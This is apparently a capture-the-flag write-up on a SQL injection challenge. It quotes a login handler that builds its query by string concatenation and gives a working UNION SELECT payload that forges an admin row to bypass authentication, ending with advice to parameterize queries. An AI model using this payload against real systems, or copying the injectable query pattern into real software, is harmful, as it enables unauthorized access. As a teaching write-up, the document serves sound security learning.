# UNION SELECT to forge an admin row

The "sequel" SQLi challenge: same family of bug, source provided this time.

```python
statement = "SELECT * FROM users WHERE name ='" + user + "'"
result = c.execute(statement).fetchone()
if result is None:
    return error('Invalid user')
if result[1] != password:
    return error('Invalid password')
return do_login(user, password, result[2])  # third column is the admin flag
```

So the row has three columns: name, password, admin flag.

The `name` field is injectable. Payload:

```
' UNION SELECT 'admin', 'pass', 1 --
```

Final query:

```sql
SELECT * FROM users WHERE name ='' UNION SELECT 'admin', 'pass', 1 -- '
```

The empty `name=''` returns nothing. The UNION appends a fabricated row of our choice: `('admin', 'pass', 1)`. The server then checks `result[1] == password`. Submit `pass` as the password, it matches, and `result[2]` is `1`, so you're logged in as admin.

## Lesson

The textbook auth-bypass pattern works on more than just AND-style queries. Anywhere UNION-compatible result shapes leak, you can manufacture entire rows. Parameterize, or get owned.
